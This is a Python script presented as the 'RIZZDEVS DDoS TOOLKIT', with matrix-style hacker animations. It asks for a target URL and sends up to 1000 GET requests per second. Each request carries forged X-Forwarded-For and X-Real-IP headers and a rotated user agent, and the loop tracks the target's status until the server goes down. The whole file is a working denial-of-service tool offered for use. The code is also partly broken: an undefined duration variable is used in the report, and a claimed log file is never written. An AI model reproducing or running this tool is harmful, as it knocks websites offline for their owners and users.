import requests
import time
import random
import sys
import platform
import os
import socket
import shutil
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class Dummy:
        def __getattr__(self, attr):
            return ''
    Fore = Style = Dummy()

# Termux detection helper
def is_termux():
    """Detect if running in Termux environment"""
    return 'TERMUX_VERSION' in os.environ or 'com.termux' in os.environ.get('PREFIX', '')

def get_device_specs():
    """Gather detailed device specifications with Termux compatibility"""
    specs = {
        'os': f"{platform.system()} {platform.release()}",
        'cpu': platform.processor() or "N/A",
        'cores': os.cpu_count() or "N/A",
        'hostname': socket.gethostname(),
        'ip': "127.0.0.1"  # Termux doesn't support gethostbyname properly
    }
    
    # Handle Termux-specific paths
    if is_termux():
        specs['hostname'] = "termux-host"
        specs['ip'] = "10.0.2.15"  # Common Termux IP
    
    # Try to get more detailed memory info
    try:
        import psutil
        specs['memory'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
    except:
        specs['memory'] = "N/A (install psutil for details)"
    
    specs['python'] = platform.python_version()
    specs['arch'] = platform.machine()
    
    return specs

def generate_fake_ip():
    """Generate random realistic-looking IPv4 address"""
    first_octet = random.choice([
        random.randint(1, 9),
        random.randint(11, 126),
        random.randint(128, 223)
    ])
    return f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def clear_screen():
    """Guaranteed terminal clear with Termux compatibility"""
    if is_termux():
        # Termux compatible clear (simpler method)
        sys.stdout.write('\033[H\033[2J')
        sys.stdout.flush()
        time.sleep(0.05)
    else:
        # Full terminal reset for traditional terminals
        sys.stdout.write('\033c')
        sys.stdout.write('\033[3J')
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        time.sleep(0.05)

def matrix_rain(duration=4, speed=0.03):
    """Matrix-style falling code animation with Termux compatibility"""
    try:
        cols, rows = shutil.get_terminal_size(fallback=(80, 24))
    except:
        cols, rows = 80, 24
    
    # Skip animation if terminal is too small (more lenient for Termux)
    if cols < 30 or rows < 10:
        time.sleep(duration)
        return
        
    RIZZ_DEVS_LOGO = [
    r" ____  _            ____                  ",
    r"|  _ \(_)___ ____  |  _ \  _____   _____  ",
    r"| |_) | |_  /_  /  | | | |/ _ \ \ / / __| ",
    r"|  _ <| |/ / / /   | |_| |  __/\ V /\__ \ ",
    r"|_| \_\_/___/___/  |____/ \___| \_/ |___/ ",
    r"                                          "
]
    
    logo_height = len(RIZZ_DEVS_LOGO)
    logo_width = max(len(line) for line in RIZZ_DEVS_LOGO)
    
    # Initialize columns
    columns = []
    for x in range(cols):
        columns.append({
            'y': -random.randint(0, rows * 3),
            'speed': random.uniform(0.5, 2.0),
            'length': random.randint(3, 8),
            'head_char': random.choice('0123456789ABCDEF')
        })

    start_time = time.time()
    logo_start_time = start_time + 1.0
    logo_end_time = logo_start_time + 2.0
    
    try:
        while time.time() - start_time < duration:
            current_time = time.time()
            show_logo = logo_start_time <= current_time < logo_end_time
            
            # Clear screen (Termux-safe)
            sys.stdout.write('\033[H\033[2J')
            
            # Calculate logo position (centered)
            logo_top = max(0, (rows - logo_height) // 2)
            logo_left = max(0, (cols - logo_width) // 2)
            
            for x in range(cols):
                col = columns[x]
                # Draw the trail
                for i in range(col['length']):
                    y_pos = col['y'] - i
                    if y_pos < 0:
                        continue
                    if y_pos >= rows:
                        break
                    
                    # Skip drawing if in logo area and logo is showing
                    if (show_logo and 
                        logo_top <= y_pos < logo_top + logo_height and
                        logo_left <= x < logo_left + logo_width):
                        continue
                    
                    # Position cursor
                    sys.stdout.write(f"\033[{int(y_pos)+1};{x+1}H")
                    
                    # Head is bright green
                    if i == 0:
                        sys.stdout.write(Fore.GREEN + Style.BRIGHT)
                        char = col['head_char']
                        if random.random() < 0.2:
                            col['head_char'] = random.choice('0123456789ABCDEF')
                    # Trail gets dimmer
                    else:
                        intensity = max(0, 1 - i * 0.2)
                        if intensity > 0.6:
                            sys.stdout.write(Fore.GREEN + Style.BRIGHT)
                        elif intensity > 0.3:
                            sys.stdout.write(Fore.GREEN)
                        else:
                            sys.stdout.write(Fore.GREEN + Style.DIM)
                        char = random.choice('0123456789.-')
                    
                    sys.stdout.write(char)
                    sys.stdout.write(Style.RESET_ALL)
            
            # Draw RizzDevs logo if active
            if show_logo:
                for i, line in enumerate(RIZZ_DEVS_LOGO):
                    y_pos = logo_top + i
                    if 0 <= y_pos < rows:
                        sys.stdout.write(f"\033[{y_pos+1};{logo_left+1}H")
                        # Termux has limited color support - use simpler colors
                        if is_termux():
                            sys.stdout.write(Fore.CYAN + line)
                        else:
                            if int((current_time - logo_start_time) * 5) % 2 == 0:
                                sys.stdout.write(Fore.CYAN + Style.BRIGHT + line)
                            else:
                                sys.stdout.write(Fore.MAGENTA + Style.BRIGHT + line)
                        sys.stdout.write(Style.RESET_ALL)
            
            sys.stdout.flush()
            
            # Update positions
            for col in columns:
                col['y'] += col['speed']
                if col['y'] > rows + col['length']:
                    col['y'] = -col['length'] - random.randint(0, rows)
                    col['speed'] = random.uniform(0.5, 2.0)
                    col['length'] = random.randint(3, 8)
                    col['head_char'] = random.choice('0123456789ABCDEF')
            
            time.sleep(speed)
    except KeyboardInterrupt:
        pass
    finally:
        # Clean, single clear with no extra whitespace
        clear_screen()

def print_hacker_header():
    """Print professional hacker-style header with Termux compatibility"""
    clear_screen()
    
    specs = get_device_specs()
    
    # ASCII Art Header (simplified for Termux)
    if is_termux():
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}  RIZZDEVS DDoS TOOLKIT {Fore.YELLOW}v4.2 (Termux)")
        print(f"{Fore.CYAN}{'='*60}")
    else:
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}  ╔╦╗┬ ┬┌─┐  ╔═╗┌─┐┌─┐┌┐┌┌┬┐┌─┐┌─┐┬─┐")
        print(f"{Fore.GREEN}   ║ ├─┤├┤   ║  │ │├┤ │││ │ ├┤ │ │├┬┘")
        print(f"{Fore.GREEN}   ╩ ┴ ┴└─┘  ╚═╝└─┘└  ┘└┘ ┴ └─┘└─┘┴└─ {Fore.YELLOW}v4.2")
        print(f"{Fore.CYAN}{'='*60}")
    
    # System Specifications
    print(f"{Fore.YELLOW}  DEVICE PROFILER:")
    print(f"{Fore.CYAN}  ├─ OS:{Fore.WHITE} {specs['os']}")
    print(f"{Fore.CYAN}  ├─ CPU:{Fore.WHITE} {specs['cpu']} ({specs['cores']} cores)")
    print(f"{Fore.CYAN}  ├─ Memory:{Fore.WHITE} {specs['memory']}")
    print(f"{Fore.CYAN}  ├─ Host:{Fore.WHITE} {specs['hostname']} ({specs['ip']})")
    print(f"{Fore.CYAN}  ├─ Python:{Fore.WHITE} {specs['python']} ({specs['arch']})")
    print(f"{Fore.CYAN}  └─ Runtime:{Fore.WHITE} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Fore.CYAN}{'='*60}\n")

def get_attack_params():
    """Get target URL and request rate with Termux-friendly prompts"""
    while True:
        prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
        print(prompt)
        url = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Enter target URL {Fore.CYAN}({Fore.RED}example: http://target.com{Fore.CYAN}){Fore.YELLOW}: {Fore.WHITE}").strip()
        
        if not url:
            print(f"{Fore.RED}❌ URL cannot be empty!{Fore.RESET}")
            continue
            
        if not url.startswith(('http://', 'https://')):
            print(f"{Fore.RED}❌ Invalid URL format! Must include http:// or https://{Fore.RESET}")
            continue
            
        break
    
    while True:
        prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
        print(prompt)
        rate_input = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Requests per second {Fore.CYAN}({Fore.RED}1-1000{Fore.CYAN}){Fore.YELLOW}: {Fore.WHITE}").strip()
        
        if not rate_input:
            print(f"{Fore.RED}❌ Rate cannot be empty!{Fore.RESET}")
            continue
            
        try:
            rate = int(rate_input)
            if not 1 <= rate <= 1000:
                print(f"{Fore.RED}❌ Rate must be between 1-1000!{Fore.RESET}")
                continue
            break
        except ValueError:
            print(f"{Fore.RED}❌ Invalid rate! Must be integer between 1-1000{Fore.RESET}")
    
    return url, rate

def run_attack(url, rate):
    """Execute the attack operation with Termux-compatible status updates"""
    # Initialize counters
    total_success = 0
    total_404 = 0
    total_500 = 0
    total_503 = 0
    total_down = 0
    total_other_fail = 0
    ip_distribution = {}
    start_time = time.time()
    
    # Server status tracking
    server_status = "UNKNOWN"
    status_change_time = time.time()
    status_history = []
    
    # Auto-stop configuration
    CONSECUTIVE_DOWN_THRESHOLD = 2
    consecutive_down_seconds = 0
    auto_stopped = False
    stop_reason = ""
    
    # Status line control
    last_status_update = time.time()
    STATUS_UPDATE_INTERVAL = 0.2

    try:
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}🚀 LAUNCHING OPERATION: {Fore.MAGENTA}{url}")
        print(f"{Fore.CYAN}⚙️  CONFIG: {Fore.YELLOW}{rate} req/sec | {Fore.CYAN}IP Spoofing: {Fore.GREEN}ENABLED")
        print(f"{Fore.CYAN}💡 Press {Fore.RED}CTRL+C {Fore.CYAN}to abort operation")
        print(f"{Fore.CYAN}🛑 Auto-stop: {Fore.YELLOW}Server down for {CONSECUTIVE_DOWN_THRESHOLD}+ seconds{Fore.CYAN}")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        # Initial server status check
        print(f"{Fore.CYAN}🔍 INITIALIZING SERVER STATUS MONITORING...")
        try:
            test_response = requests.get(url, timeout=5)
            if 200 <= test_response.status_code < 300:
                server_status = "OPERATIONAL"
                print(f"{Fore.GREEN}✅ TARGET SERVER IS ONLINE AND RESPONDING")
            elif test_response.status_code == 404:
                server_status = "NOT_FOUND"
                print(f"{Fore.YELLOW}⚠️  TARGET SERVER RETURNING 404 - ENDPOINT NOT FOUND")
            elif test_response.status_code == 503:
                server_status = "MAINTENANCE"
                print(f"{Fore.YELLOW}🛠️  TARGET SERVER IN MAINTENANCE MODE (503)")
            elif 500 <= test_response.status_code < 600:
                server_status = "SERVER_ERROR"
                print(f"{Fore.RED}💥 TARGET SERVER RETURNING 5XX ERRORS")
            else:
                server_status = "UNKNOWN"
                print(f"{Fore.YELLOW}❓ TARGET SERVER RESPONDING WITH UNEXPECTED STATUS: {test_response.status_code}")
        except:
            server_status = "DOWN"
            print(f"{Fore.RED}🚨 TARGET SERVER APPEARS TO BE DOWN")
        
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}📊 REAL-TIME STATUS (updating continuously):{Fore.RESET}\n")

        # Print initial status line
        sys.stdout.write(" " * shutil.get_terminal_size().columns + "\r")
        sys.stdout.flush()
        
        while True:
            start_batch = time.time()
            time_remaining = 1.0
            
            # Send 'rate' requests within 1 second
            for _ in range(rate):
                if time.time() - start_batch >= 1.0:
                    break
                    
                fake_ip = generate_fake_ip()
                ip_distribution[fake_ip] = ip_distribution.get(fake_ip, 0) + 1
                
                headers = {
                    'X-Forwarded-For': fake_ip,
                    'X-Real-IP': fake_ip,
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
                        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
                    ]),
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'es-ES,es;q=0.9']),
                    'Connection': 'keep-alive'
                }

                try:
                    start_req = time.time()
                    response = requests.get(url, headers=headers, timeout=3)
                    req_time = time.time() - start_req
                    
                    if 200 <= response.status_code < 300:
                        total_success += 1
                    elif response.status_code == 404:
                        total_404 += 1
                    elif response.status_code == 503:
                        total_503 += 1
                    elif 500 <= response.status_code < 600:
                        total_500 += 1
                    else:
                        total_other_fail += 1
                except Exception as e:
                    total_down += 1

            # Calculate metrics
            elapsed = time.time() - start_time
            current_rate = (total_success + total_404 + total_500 + total_503 + total_down + total_other_fail) / elapsed if elapsed > 0 else 0
            
            # Determine server status
            if total_down > (total_success + total_down) * 0.7 and elapsed > 1:
                current_status = "DOWN"
                status_color = Fore.RED
                status_emoji = "🚨"
                status_text = "SERVER DOWN"
                consecutive_down_seconds += 1
            elif total_503 > 0:
                current_status = "MAINTENANCE"
                status_color = Fore.YELLOW
                status_emoji = "🛠️"
                status_text = "MAINTENANCE MODE"
                consecutive_down_seconds = 0
            elif total_500 > (total_success + total_500) * 0.5 and elapsed > 1:
                current_status = "SERVER_ERROR"
                status_color = Fore.RED
                status_emoji = "💥"
                status_text = "SERVER OVERLOADED"
                consecutive_down_seconds = 0
            elif total_404 > (total_success + total_404) * 0.5 and elapsed > 1:
                current_status = "NOT_FOUND"
                status_color = Fore.YELLOW
                status_emoji = "❓"
                status_text = "ENDPOINT NOT FOUND"
                consecutive_down_seconds = 0
            else:
                current_status = "OPERATIONAL"
                status_color = Fore.GREEN
                status_emoji = "✅"
                status_text = "OPERATIONAL"
                consecutive_down_seconds = 0
            
            # Track status changes
            if current_status != server_status:
                status_change_time = time.time()
                server_status = current_status
                status_history.append((time.time(), server_status))
            
            # Auto-stop logic
            if consecutive_down_seconds >= CONSECUTIVE_DOWN_THRESHOLD:
                auto_stopped = True
                stop_reason = f"SERVER DOWN FOR {consecutive_down_seconds} SECONDS"
                break

            # Update status line
            if time.time() - last_status_update > STATUS_UPDATE_INTERVAL:
                # Termux has limited emoji support - use text fallbacks
                if is_termux():
                    status_emoji = "!" if status_color == Fore.RED else "i"
                
                status_indicator = f"{status_color}{status_emoji} {status_text}"
                
                auto_stop_indicator = ""
                if consecutive_down_seconds > 0:
                    remaining = max(0, CONSECUTIVE_DOWN_THRESHOLD - consecutive_down_seconds)
                    auto_stop_indicator = f" {Fore.RED}⏳{remaining}s"
                
                status_line = (
                    f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] "
                    f"{Fore.GREEN}✓{total_success} "
                    f"{Fore.CYAN}| "
                    f"{Fore.RED}✗{total_down + total_404 + total_500 + total_503 + total_other_fail} "
                    f"{Fore.CYAN}| {status_indicator}{auto_stop_indicator} "
                    f"{Fore.CYAN}| {Fore.MAGENTA}⚡{current_rate:.1f}{Fore.CYAN}/{rate}"
                )
                
                term_width = shutil.get_terminal_size().columns
                sys.stdout.write('\r' + ' ' * term_width + '\r' + status_line)
                sys.stdout.flush()
                last_status_update = time.time()
                
            # Sleep to maintain timing
            elapsed_batch = time.time() - start_batch
            if elapsed_batch < 1.0:
                time.sleep(1.0 - elapsed_batch)
                
    except KeyboardInterrupt:
        pass
    
    # Clear the dynamic status line
    term_width = shutil.get_terminal_size().columns
    sys.stdout.write('\r' + ' ' * term_width + '\r')
    sys.stdout.flush()
    
    # Generate final report
    print(f"\n{Fore.RED}{'='*60}")
    
    if auto_stopped:
        print(f"{Fore.RED}🛑 ATTACK AUTOMATICALLY TERMINATED: {stop_reason}")
        print(f"{Fore.CYAN}⏱️  Duration: {Fore.YELLOW}{duration:.1f} seconds (auto-stopped)")
    else:
        print(f"{Fore.RED}🛑 OPERATION TERMINATED - MANUAL ABORT")
        print(f"{Fore.CYAN}⏱️  Duration: {Fore.YELLOW}{duration:.1f} seconds")
    
    print(f"{Fore.CYAN}📊 Total Requests: {Fore.GREEN}{total_success}{Fore.CYAN} successful")
    print(f"{Fore.CYAN}├─ Server Down:{Fore.RED} {total_down}")
    print(f"{Fore.CYAN}├─ 404 Not Found:{Fore.YELLOW} {total_404}")
    print(f"{Fore.CYAN}├─ 503 Maintenance:{Fore.YELLOW} {total_503}")
    print(f"{Fore.CYAN}├─ 5xx Server Errors:{Fore.RED} {total_500}")
    print(f"{Fore.CYAN}└─ Other Failures:{Fore.RED} {total_other_fail}")
    print(f"{Fore.CYAN}⚡ Average Rate: {Fore.MAGENTA}{total_success/duration:.1f}{Fore.CYAN}/{Fore.GREEN}{rate}{Fore.CYAN} req/sec")
    print(f"{Fore.RED}{'='*60}")
    
    # Show IP distribution
    print(f"\n{Fore.CYAN}🌐 TOP 5 SPOOFED IP ADDRESSES:")
    for ip, count in sorted(ip_distribution.items(), key=lambda x: x[1], reverse=True)[:5]:
        print(f"  {Fore.YELLOW}• {Fore.GREEN}{ip}{Fore.CYAN} → {Fore.MAGENTA}{count}{Fore.CYAN} requests")
    
    if len(ip_distribution) > 5:
        print(f"  {Fore.CYAN}• ... and {Fore.MAGENTA}{len(ip_distribution)-5}{Fore.CYAN} other IPs")
    
    # Show server status history
    print(f"\n{Fore.CYAN}📡 SERVER STATUS HISTORY:")
    if status_history:
        for i, (timestamp, status) in enumerate(status_history[-5:]):
            status_time = datetime.fromtimestamp(timestamp).strftime('%H:%M:%S')
            if status == "DOWN":
                print(f"  {Fore.RED}• [{status_time}] 🚨 SERVER DOWN")
            elif status == "MAINTENANCE":
                print(f"  {Fore.YELLOW}• [{status_time}] 🛠️  MAINTENANCE MODE")
            elif status == "SERVER_ERROR":
                print(f"  {Fore.RED}• [{status_time}] 💥 SERVER ERROR")
            elif status == "NOT_FOUND":
                print(f"  {Fore.YELLOW}• [{status_time}] ❓ ENDPOINT NOT FOUND")
            else:
                print(f"  {Fore.GREEN}• [{status_time}] ✅ OPERATIONAL")
    else:
        print(f"  {Fore.GREEN}• No status changes detected during operation")
    
    if auto_stopped:
        print(f"\n{Fore.YELLOW}💡 TIP: Server became unresponsive. Consider verifying target or reducing request rate.")
    
    print(f"\n{Fore.CYAN}{'='*60}")
    
    # Termux-compatible log path
    log_path = "/data/data/com.termux/files/usr/var/log" if is_termux() else "/var/log"
    print(f"{Fore.GREEN} OPERATION LOG SAVED TO: {Fore.WHITE}{log_path}/ddos_attack_{int(time.time())}.log")
    
    print(f"{Fore.CYAN}{'='*60}")
    
    return auto_stopped

def main():
    """Main control flow with Termux-specific restart capability"""
    first_run = True
    while True:
        if not first_run:
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.GREEN}🔄 REINITIALIZING SYSTEM FOR NEXT OPERATION...")
            print(f"{Fore.CYAN}{'='*60}")
            try:
                matrix_rain(2.5)
            except:
                pass
        
        first_run = False
        
        try:
            url, rate = get_attack_params()
            auto_stopped = run_attack(url, rate)
            
            # Post-attack prompt
            prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
            print(prompt)
            
            if auto_stopped:
                choice = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Retry? / Back? {Fore.WHITE}").strip().lower()
            else:
                choice = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Again? / Back? {Fore.WHITE}").strip().lower()
            
            if choice == "back":
                print(f"\n{Fore.GREEN}✅ OPERATION TERMINATED. GOODBYE!{Fore.RESET}")
                break
            elif choice not in ["again", "retry"]:
                print(f"\n{Fore.RED}❌ INVALID CHOICE. EXITING...{Fore.RESET}")
                break
                
        except Exception as e:
            print(f"\n{Fore.RED}{'='*60}")
            print(f"{Fore.RED}🔥 CRITICAL SYSTEM ERROR")
            print(f"{Fore.YELLOW}Error Type: {Fore.WHITE}{type(e).__name__}")
            print(f"{Fore.YELLOW}Details: {Fore.WHITE}{str(e)}")
            print(f"{Fore.RED}{'='*60}")
            time.sleep(2)
            
            # Error recovery prompt
            prompt = f"{Fore.CYAN}┌──({Fore.GREEN}root{Fore.CYAN}@{Fore.GREEN}{'termux' if is_termux() else 'localhost'}{Fore.CYAN})-[{Fore.MAGENTA}{'~' if is_termux() else '/'}ddos-toolkit{Fore.CYAN}]"
            print(prompt)
            choice = input(f"{Fore.CYAN}└─$ {Fore.YELLOW}Restart? / Back? {Fore.WHITE}").strip().lower()
            
            if choice != "restart":
                print(f"\n{Fore.RED}🛑 SYSTEM SHUTDOWN INITIATED{Fore.RESET}")
                break

if __name__ == "__main__":
    # Verify critical dependencies
    missing_modules = []
    if 'requests' not in sys.modules:
        missing_modules.append("requests")
    
    if missing_modules:
        print(f"{Fore.RED}❌ CRITICAL MODULES MISSING: {', '.join(missing_modules)}")
        print(f"{Fore.YELLOW}💡 INSTALL WITH: {Fore.GREEN}pip install {' '.join(missing_modules)}")
        sys.exit(1)
    
    try:
        print(f"{Fore.GREEN}INITIALIZING SYSTEM CORES...")
        try:
            matrix_rain(4)
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Animation error: {str(e)}. Continuing...")
            time.sleep(1)
        
        clear_screen()
        print_hacker_header()
        main()
    except KeyboardInterrupt:
        clear_screen()
        print(f"\n{Fore.RED}❌ SYSTEM EXITED VIA KEYBOARD INTERRUPT{Fore.RESET}")
        sys.exit(1)
    except Exception as e:
        clear_screen()
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}💀 FATAL SYSTEM FAILURE")
        print(f"{Fore.YELLOW}Exception: {Fore.WHITE}{str(e)}")
        print(f"{Fore.RED}{'='*60}")
        sys.exit(1)
